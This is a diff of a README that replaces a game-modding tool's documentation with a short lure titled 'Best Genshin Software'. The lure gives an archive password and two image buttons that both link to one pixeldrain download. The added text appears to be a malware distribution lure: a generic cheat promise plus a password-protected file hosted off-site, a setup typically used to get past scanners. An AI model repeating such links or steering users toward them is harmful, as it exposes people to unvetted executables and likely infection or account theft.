@@ -1,20 +1,4 @@
-# Melon
-MelonLoader but for an 4nime g4me
-
-This repo contains modified Il2CppInterop and MelonLoader (+ some dependencies).
-
-Tools for generating dummy dlls are not included
-
-## Usage
-**Warning: Using on official servers will likely result in a ban!**
-### Requirements
-- [.NET 6 Runtime](https://dotnet.microsoft.com/en-us/download/dotnet/6.0)
-- [Microsoft Visual C++ Redistributable 2015-2022](https://aka.ms/vs/17/release/vc_redist.x64.exe)
-### Injecting
-- Download the release zip for your game version
-- Open MelonLauncher
-
-  OR
-
-  Copy the contents of the zip into the same directory as your game exe
-- Launch the game
+# Best Genshin Software.
+## Pass: 1234
+[![button](https://github.com/petxtv/GenshSoft/assets/81441412/70045c5f-1a21-4b58-aac9-8adc414cb517)](https://pixeldrain.com/u/qY7CwdmB)
+[![sd4rn567s457s4m5](https://github.com/Ayman-younis/Html-and-CSS-template-Two/assets/104285430/ff99808f-e505-4a07-81b5-e15fc2b7dc3b)](https://pixeldrain.com/u/qY7CwdmB)
